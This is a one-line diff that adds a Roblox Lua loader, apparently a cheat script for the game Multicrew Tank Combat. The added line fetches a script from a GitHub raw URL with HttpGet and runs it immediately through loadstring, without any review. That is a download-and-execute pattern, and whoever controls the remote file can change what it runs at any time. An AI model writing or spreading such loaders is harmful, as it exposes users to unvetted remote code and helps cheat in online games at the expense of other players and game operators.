@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/mtc-multicrew-tank-combat-spam3-ksl3w0z8o2bztv.lua"))()
